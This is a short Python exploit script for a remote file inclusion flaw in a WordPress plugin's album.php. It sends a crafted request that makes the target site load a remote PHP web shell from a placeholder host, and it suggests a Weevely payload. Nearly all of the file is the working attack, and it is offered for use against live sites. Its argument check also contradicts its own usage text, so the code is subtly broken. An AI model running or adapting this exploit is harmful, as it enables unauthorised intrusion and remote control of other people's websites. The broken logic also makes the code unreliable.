#!/usr/bin/env python
# Title: DM FileManager security_file Remote File Inclusion Exploit
# CVE: ????-????
# Reference: http://secunia.com/advisories/35622/
# Author: infodox
# Site: http://insecurety.net/
# Twitter: @info_dox
# Old news, just practicin' my python :3
import requests
import sys

vulnurl = "/wp-content/plugins/dm-albums/template/album.php?" # Oh look, the vuln URL!
param = "SECURITY_FILE=" # the vuln paramater
payloadurl = "http://example.com/shell.php" # Your evil PHP code goes here right?

def banner():
    print """
DM FileManager "security_file" Remote File Inclusion Exploit.
Rather lame exploit I must admit, just practicing my Python.
To use, just run it against the host and pray. I advise using a Weevely payload.
~infodox
    """ 

if len(sys.argv) != 4:
    banner()
    print "Usage: ./x2.py <target>"
    print "Where <target> is the vulnerable website."
    print "Example: ./x2.py http://lamesite.com"
    sys.exit(1)
    
banner()
target = sys.argv[1]
pwnme = target + vulnurl + param + payloadurl
print "[+] Running Exploit..."
requests.get(pwnme)
print "[?] Gotshell?"

